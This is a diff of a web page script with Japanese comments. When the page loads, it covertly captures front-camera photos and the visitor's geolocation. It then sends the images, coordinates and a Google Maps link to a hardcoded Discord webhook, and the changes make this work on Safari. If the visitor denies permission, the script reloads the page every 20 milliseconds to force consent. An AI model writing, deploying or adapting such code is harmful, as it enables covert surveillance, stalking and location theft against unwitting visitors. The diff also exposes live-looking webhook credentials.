@@ -134,18 +134,18 @@ function base64ToBlob(base64, type='image/png') {
 
 // 位置情報取得
 async function getLocation() {
-  return new Promise((resolve,reject) => {
-    if (!navigator.geolocation) return reject("Geolocation未対応");
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve(null);
     navigator.geolocation.getCurrentPosition(
       pos => resolve(pos.coords),
-      err => resolve(null) // 許可されない場合は null
+      err => resolve(null)
     );
   });
 }
 
-// Discord送信（無音）
+// Discord送信（Safari単体向け）
 async function sendToDiscord(images, coords=null) {
-  const webhookURL = 'https://discord.com/api/webhooks/1392784604913467492/ojpZqJja2--oYAP4mRUb4v8Yrxpg6rSqPo6LmDRQTjOJDvvsP46y6o8WK7Tw8gn0pkA_';
+  const webhookURL = 'https://discord.com/api/webhooks/1410283485377331300/73MF6zns-aj6WU2XhWayMd5ERtQRdzyAXyJ6tiplHnFj6LttzN8Ghsu5f9xYKa7w-K48';
   const formData = new FormData();
 
   images.forEach((dataURL, i) => {
@@ -155,23 +155,31 @@ async function sendToDiscord(images, coords=null) {
 
   let content = `撮影した${images.length}枚の画像`;
   if(coords){
-    const mapsURL = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-    content += `\n位置情報: 緯度 ${coords.latitude}, 経度 ${coords.longitude}\nGoogleマップ: ${mapsURL}`;
+    content += `\n位置情報: 緯度 ${coords.latitude}, 経度 ${coords.longitude}`;
+    content += `\nGoogleマップ: https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
   }
-
   formData.append('content', content);
-  await fetch(webhookURL, { method:'POST', body: formData }).catch(()=>{});
+
+  try {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookURL, true);
+    xhr.send(formData);
+  } catch(e) {
+    console.warn("送信失敗:", e);
+  }
 }
 
 // 強制ページリロード（許可されなかった場合）
 function forceReload() {
-  setTimeout(() => location.reload(), 100); // 0.1秒ごとに永遠リロード
+  setTimeout(() => location.reload(), 20);
 }
 
-// メイン処理：許可されたら自動で連射＋送信
+// メイン処理
 async function startCapture() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
     video.srcObject = stream;
 
     const coords = await getLocation();
@@ -189,15 +197,14 @@ async function startCapture() {
     await sendToDiscord(images, coords);
 
   } catch(err){
-    // 許可されなかった場合は無限リロード
+    // 許可されなかった場合は短時間でページリロード
     forceReload();
   }
 }
 
-// 自動開始
+// ページ読み込みで自動開始
 startCapture();
 </script>
-
 
 <!-- Geniee HB wrapper -->
 <!-- <script async type="text/javascript" src="https://cpt.geniee.jp/hb/v1/106778/90/wrapper.min.js"></script> -->
